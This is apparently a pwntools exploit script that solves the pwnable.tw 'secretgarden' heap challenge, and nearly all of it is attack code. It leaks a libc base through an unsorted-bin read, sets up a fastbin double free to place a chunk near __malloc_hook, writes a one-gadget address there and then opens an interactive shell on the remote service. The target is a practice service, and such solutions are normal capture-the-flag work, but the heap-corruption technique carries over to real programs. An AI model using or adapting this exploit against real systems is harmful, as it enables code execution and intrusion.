from pwn import *

#context.log_level = 'debug'

#s = process("./secretgarden",env={'LD_PRELOAD':'/home/junhaserv/pwn/pwnable.tw/libc_64.so.6'})
s = remote("chall.pwnable.tw",10203)

e = ELF("./secretgarden")
#libc = e.libc
libc = ELF("/home/junhaserv/pwn/pwnable.tw/libc_64.so.6")

def add(length,name,color):
	s.recvuntil("Your choice : ")
	s.sendline("1")
	s.recvuntil("Length of the name :")
	s.sendline(str(length))
	s.recvuntil("The name of flower :")
	s.sendline(name)
	s.recvuntil("The color of the flower :")
	s.sendline(color)

def print_func():
	s.recvuntil("Your choice : ")
	s.sendline("2")

def del_index(index):
	s.recvuntil("Your choice : ")
	s.sendline("3")
	s.recvuntil("Which flower do you want to remove from the garden:")
	s.sendline(str(index))

size = 0x60

#gdb.attach(s)
#pause()

add(0x100,"aaaa","aaaa") #0
add(0x100,"aaaa","aaaa") #1
add(40,"aaaa","aaaa") #2
del_index(0)
del_index(2)
add(0x100,"","aaaa") #3

print_func()

offset = 0x3c3b0a

s.recvuntil("[3] :")
log.success("offset : " + hex(offset))
leak = u64(s.recv(6).ljust(8,'\x00'))
log.info("leak : " + hex(leak))
base = leak - offset
log.info("base : " + hex(base))
malloc_hook = base + libc.symbols['__malloc_hook']
log.info("hook : " + hex(malloc_hook))
oneshot = base + 0xef6c4

#pause()

del_index(1)
del_index(3)

s.recvuntil("Your choice : ")
s.sendline("4")

add(size,"aaaa","aaaa") #4
add(size,"aaaa","aaaa") #5

del_index(0)
del_index(1)
del_index(0)

add(size,p64(malloc_hook - 0x23),"aaaa")
add(size,"aaaa","aaaa")
add(size,"aaaa","aaaa")

pay = "A"*19 + p64(oneshot)

add(size,pay,"aaaa")

del_index(0)
del_index(0)

s.interactive()
